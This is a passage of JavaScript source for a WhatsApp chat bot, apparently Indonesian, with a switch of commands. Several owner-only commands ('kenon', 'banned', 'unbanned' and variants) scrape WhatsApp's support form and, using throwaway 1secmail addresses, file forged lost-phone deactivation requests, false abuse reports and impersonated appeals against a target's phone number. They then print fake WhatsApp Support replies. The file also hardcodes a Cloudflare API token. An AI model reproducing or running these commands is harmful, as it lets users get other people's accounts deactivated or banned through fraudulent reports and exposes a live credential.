    if (!isCreator) return reply('*Khusus Owner*')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "aad806c073e06d112b9fc2d2bc67f4b3";
               let apitoken = "2SseHIYk7KmE6z9wFsgKoXde5OpK5VzCdrtA6NyT";
               let tld = "lenwy.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("Maaf Untuk saat Ini Owner Tidak Menjual Domain 😔");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           
case 'verif@': case 'kenon': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Perdido/roubado: desative minha conta`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19574.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007982238")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Hai,

 Terima kasih atas pesan Anda.

 Kami telah menonaktifkan akun WhatsApp Anda.  Ini berarti akun Anda telah di keluarkan maka untuk sementara dinonaktifkan dan akan dihapus secara otomatis dalam 30 hari jika Anda tidak mendaftarkan ulang akun tersebut.  Harap dicatat: Tim Dukungan Pelanggan WhatsApp tidak dapat menghapus akun Anda secara manual.

 Selama periode penonaktifan:

 • Kontak Anda di WhatsApp mungkin masih melihat nama dan gambar profil Anda.
 • Setiap pesan yang mungkin dikirim oleh kontak Anda ke

 akun akan tetap dalam status tertunda hingga 30 hari.

 Jika Anda ingin mendapatkan kembali akun Anda, daftarkan ulang akun Anda sebagai

 secepatnya.  Daftar ulang akun Anda dengan memasukkan 6 digit

 kode yang Anda terima melalui SMS atau panggilan telepon.  Jika Anda mendaftar ulang

 pulihkan riwayat obrolan Anda di: Android |  iPhone.

 file, cadangan, atau riwayat panggilan dari akun yang dihapus.

 akun sebelum dihapus, Anda akan tetap berada di semua obrolan grup.  Anda akan memiliki opsi untuk memulihkan data Anda.  Pelajari caranya Jika Anda tidak mendaftarkan ulang akun Anda, akun tersebut mungkin akan dihapus dan proses ini tidak dapat dibatalkan.  Sayangnya, WhatsApp tidak dapat membantu Anda memulihkan obrolan, dokumen, media

 Catatan: Jika perangkat Anda hilang atau dicuri, sebaiknya hubungi penyedia seluler Anda untuk memblokir kartu SIM Anda sesegera mungkin.  Memblokir kartu SIM Anda mencegah orang lain mendaftar dan mengakses akun yang terkait dengan kartu SIM.

 Sumber daya terkait:

 ⚫ Untuk informasi lebih lanjut tentang penonaktifan akun pada ponsel yang hilang dan dicuri, silakan baca artikel ini.

 ⚫ Pelajari tentang akun yang dicuri di artikel ini.

 Jika Anda memiliki pertanyaan atau masalah lain, jangan ragu untuk menghubungi kami.  Kami akan dengan senang hati membantu!`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break

case 'banned': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `I noticed that a user was using modified whatsapp, so i ask support to ban this account for violating terms of service, and the account uses a WhatsApp bot that can send malicious messages so that other users' WhatsApp cannot work
Number : +${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses banned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp :3`)
await LenwyLD(180000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break

case 'unbanned': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Aku Tidak Tau Mengapa Nomor Saya Tiba Tiba Di Larang Dari Menggunakan WhatsApp Aku Hanya Membalas Pesan Customer Saya Mohon Buka Larangan Akun WhatsApp Saya: [+${targetnya}]
Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp :3`)
await LenwyLD(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break

case 'unbannedv2': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Pihak WhatsApp yang terhormat mohon bantuan anda segera
[${targetnya}]
Saya telah mengirim beberapa email dan laporan ke pihak WhatsApp untuk mengajukan banding agar nomor saya cepat di buka dari daftar blokir, saya sangat membutuhkan untuk keperluan pribadi berkomunikasi dengan keluarga jika saya melakukan pelanggaran sebelumnya maka saya akan menggunakan nomor saya tersebut dengan lebih hati-hati dan lebih baik lagi dari sebelumnya dan saya sekarang telah menuruti apa yang pihak WhatsApp sarankan, dan saya sangat berharap sekarang juga nomor saya dapat di gunakan kembali. Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp :3`)
await LenwyLD(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break

case 'unbannedv3': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Hola WhatsApp
Actualmente, algunas personas tienen muchas formas efectivas de bloquear números de usuario e informarlos sin ningún motivo, de hecho, conozco bien los términos de servicio y los cumplí, pero algunos piratas informáticos me hicieron un informe falso y mi número fue bloqueado, desbloquee el número ${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp :3`)
await LenwyLD(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break

case 'unbannedv4': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Good day whatsApp team. My whatApp account has been burned permanently, please i plead with you unblock it, i cannot use another number again. I don’t know why it is burned but my friends re suggesting its because i use GB whatsApp, which i didn’t know it was wrong. My number is [ ${targetnya} ]. Please whatsApp team, help me unblock my account. please i cannot use a new number as my current number is connected to slot of important things like vacancies.
Thank you`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp :3`)
await LenwyLD(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break

case 'unbannedv5': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Aloha WhatsApp, ua ʻaihue ʻia kaʻu helu e ka mea hacker, e ʻoluʻolu e wehe hou iā ia [${targetnya}]`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp :3`)
await LenwyLD(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break

case 'limit':{
reply('❄️️ *Sisa Limit Kamu :* ' + (db.data.users[m.sender].limit))
}
break

case 'level':{
reply('❄️️ *Level kamu:* ' + (db.data.users[m.sender].level))
}
break

case 'leaderboard': {
let users = Object.entries(global.db.data.users).map(([key, value]) => {
    return {...value, jid: key}
  })
  let sortedLevel = users.map(toNumber('level')).sort(sort('level'))
  let usersLevel = sortedLevel.map(enumGetKey)
  let len = args[0] && args[0].length > 0 ? Math.min(10, Math.max(parseInt(args[0]), 10)) : Math.min(10, sortedLevel.length)
  let text = `• *Level Leaderboard Top ${len}* •
Kamu: *${usersLevel.indexOf(m.sender) + 1}* dari *${usersLevel.length}*

${sortedLevel.slice(0, len).map(({ jid, level }, i) => `${i + 1}. ${participants.some(p => jid === p.jid) ? `(${conn.getName(jid)}) wa.me/` : '@'}${jid.split`@`[0]} *Level ${level}*`).join`\n`}`.trim()
reply(text)
}
break

case 'resetlimit': {
if (!isCreator) return reply(mess.owner)
let list = Object.entries(global.db.data.users)
	let lim = !args || !args[0] ? 50 : isNumber(args[0]) ? parseInt(args[0]) : 50
	lim = Math.max(1, lim)
	list.map(([user, data], i) => (Number(data.limit = lim)))
		lenwy.sendMessage(m.chat, {text: `❄️️ *Limit Direset ${lim} / User*`}, { quoted: len })
		}
break

case 'addlimit': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply('❄️️ *Masukkan Jumlah Limit Yang Akan Diberi*')
    let who
    if (m.isGroup) who = m.mentionedJid[0]
    else who = m.chat
    if (!who) throw '❄️️ *Tag Orangnya*'
    let txt = text.replace('@' + who.split`@`[0], '').trim()
    if (isNaN(txt)) throw '❄️️ *Hanya Angka*'
    let poin = parseInt(txt)
    let limit = poin
    if (limit < 1) throw '❄️️ *Minimal 1*'
    let user = global.db.data.users
    user[who].limit += poin
    if (limit > 9999999) return reply('❄️️ *Kebanyakan*') 
    lenwy.sendMessage(m.chat, {text: `🎁 *Selamat @${who.split`@`[0]}. Kamu Mendapatkan +${poin} Limit!*`}, {quoted:m})
    }
break

case 'hd': case 'hdr': case 'remini': {
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return reply(`❄️️ *Send/Reply Foto Dengan Caption ${prefix + command}*`)
if (global.db.data.users[m.sender].limit < 1) return reply('❄️️ *Limit Kamu Habis*') // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
reply('❄️️ *5 Limit Digunakan*')
let media = await quoted.download()
let proses = await remini(media, "enhance");
lenwy.sendMessage(m.chat, { image: proses, caption: '❄️️ *Selesai*'}, { quoted: m})
}
break

case 'toanime': {
if (!isCreator) return reply('*Khusus Premium*')
LenwyLD()
const meks = await lenwy.downloadAndSaveMediaMessage(quoted)
const oke = await uptotelegra(meks)
result = await getBuffer(`https://vihangayt.me/tools/toanime?url=${oke}`)
lenwy.sendMessage(m.chat, {image: result, mimetype: 'image/png'}, {quoted:m})
}
break

case 'colorize': {
if (!isCreator) return reply('*Khusus Premium*')
if (!quoted) return reply(`Kirim/Reply Gambar Hitam Putih Dengan Caption ${prefix+command}`)
LenwyLD()
const meks = await lenwy.downloadAndSaveMediaMessage(quoted)
const oke = await uptotelegra(meks)
result = await getBuffer(`https://vihangayt.me/tools/colorize?url=${oke}`)
lenwy.sendMessage(m.chat, {image: result, mimetype: 'image/png'}, {quoted:m})
}
break

case 'ai': case 'openai':
try {
if (global.keyopenai === '') return reply("❄️️ Kayaknya Ada Error Di Apikey Nih");
if (!q) return reply(`❄️️ *Halo Aku Adalah Program Yang Diciptakan Oleh Kamiya, Ada Yang Ingin Ditanyakan?*`)
reply('❄️️ *Sabar Yaa*')
const { Configuration, OpenAIApi } = require('openai')
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createCompletion({
model: "text-davinci-003",
prompt: q,
temperature: 0.3,
max_tokens: 2000,
top_p: 1.0,
frequency_penalty: 0.0,
presence_penalty: 0.0,
});
reply(`${response.data.choices[0].text}`);
} catch (error) {
if (error.response) {
console.log(error.response.status);
console.log(error.response.data);
console.log(`${error.response.status}\n\n${error.response.data}`);
} else {
console.log(error);
reply("❄️️ *Ada Error Nih :*"+ error.message);
}
}
break

case 'miku': {
               
    if(!text) return reply(`masukan text`)
    let api = await fetch(`https://api-kazedevid.vercel.app/ai/charaai?chara=Miku&text=${text}`)
    let json = await api.json()
    try {
    await m.reply(json)
    } catch (err) {
    m.reply(util.format(api))
    }
    }
    break
            case 'zeta': {
                           
                if (!q) return reply('Example: Apa Itu Javascript')
                let d = await fetchJson(`https://api.yanzbotz.my.id/api/ai/characterai?text=${text}&name=ryo-yamada`)                
               // await lenwy.sendMessage(from, {
                 //   text: d.result
                reply(d.result), { quoted: m}
            }
            break
        case'ryo': {
try {
if (!text) return reply(`Contoh:\n${prefix}${command} siapa pencipta mu?`)
let messages = [{ role: 'system', content: `ubah gaya bicara mu agar lebih karateristik dan lebih terbuka dan namamu adalah ryo kamu merupakan seorang perempuan yang diciptakan oleh Kamiya dan kamu sangat mencintai kamiya tugasmu membantu user ekspresi kan sifat mu dengan emoji dan bicara yang lebih Formal dan panggilanmu adalah aku dan kamu layaknya seorang suami dan istri.` }, { role: 'user', content: text }]
let ini = (await axios.post(`https://skizo.tech/api/openai?apikey=okta`, { messages })).data
let hasil = `${ini.result}`
reply(hasil)
} catch (err) {
console.log(err) 
reply('Terjadi Kesalahan') }
}
break

case 'ask': {
                if (!q) return reply(`❄️️ *Contoh : Ask Siapa Presiden Indonesia*`)
                reply('❄️️ *Sabar Yaa*')
